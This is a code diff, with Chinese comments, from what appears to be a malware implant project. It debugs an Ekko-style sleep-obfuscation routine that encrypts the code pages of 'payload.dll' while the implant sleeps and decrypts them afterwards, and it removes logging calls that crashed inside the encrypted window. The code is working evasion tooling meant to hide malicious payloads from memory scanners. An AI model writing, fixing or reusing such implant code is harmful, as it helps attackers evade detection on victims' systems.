@@ -360,17 +360,23 @@ ekko_sleep_entry:
 
     // ★ v3.37: EncryptAll/DecryptAll 已安全化 (检查 VirtualProtect 返回值)
     // ★ BUILD 567 v3.238 DIAG: EncryptAll 前后日志
+    // ★ BUILD 567 v3.242 FIX: 移除加密窗口内的 EkkoDiagLog 调用
+    //   根因: EkkoDiagLog 内部调用 CRT 函数 (vsnprintf/snprintf/strlen/memcpy),
+    //         这些函数代码页在 payload.dll .text 段未豁免位置, 被 EncryptAll 加密 → 崩溃
+    //   修复: 移除 EncryptAll 之后 / DecryptAll 之前的所有 EkkoDiagLog 调用
+    //   保留: EncryptAll 之前 (代码页未加密) 和 DecryptAll 之后 (代码页已解密) 的日志
     EkkoDiagLog("B238:EK:EA+ pre\n");
     EncryptAll();
-    EkkoDiagLog("B238:EK:EA+ post\n");
+    // ★ v3.242: 移除 "B238:EK:EA+ post" (EncryptAll 之后, CRT 代码页已加密, 调用 EkkoDiagLog 会崩溃)
+    //   若 B238:EK:DA+ post 出现 → EncryptAll + WaitForSingleObject + DecryptAll 全部成功
+    //   若 B238:EK:DA+ post 未出现 → 崩溃在 EncryptAll 内部 或 WaitForSingleObject 或 DecryptAll
 
     HANDLE hWaitableTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
     if (!hWaitableTimer) {
-        EkkoDiagLog("B238:EK:timer FAIL err=%u — fallback ObfuscatedSleep\n",
-            (unsigned)GetLastError());
+        // ★ v3.242: 移除 "B238:EK:timer FAIL" (加密窗口内, EkkoDiagLog 调用会崩溃)
         DecryptAll();  // 加密后必须解密, 否则内存处于损坏状态
         ObfuscatedSleep(milliseconds);
-        EkkoDiagLog("B238:EK:exit (fallback)\n");
+        EkkoDiagLog("B238:EK:exit (fallback)\n");  // ✅ DecryptAll 之后, 安全
         return;
     }
 
@@ -382,9 +388,10 @@ ekko_sleep_entry:
 
     // ★ BUILD 567 v3.238 DIAG: DecryptAll 前后日志
     //   若 pre 有 post 无 → DecryptAll 内部崩溃 (代码页保持加密)
-    EkkoDiagLog("B238:EK:DA+ pre\n");
+    // ★ BUILD 567 v3.242 FIX: 移除 "B238:EK:DA+ pre" (DecryptAll 之前, 代码页仍加密)
+    // ★ v3.242: 移除 "B238:EK:DA+ pre" (加密窗口内, EkkoDiagLog 调用会崩溃)
     DecryptAll();
-    EkkoDiagLog("B238:EK:DA+ post\n");
+    EkkoDiagLog("B238:EK:DA+ post\n");  // ✅ DecryptAll 之后, 代码页已解密, 安全
 
     CloseHandle(hWaitableTimer);
     EkkoDiagLog("B238:EK:exit (normal)\n");
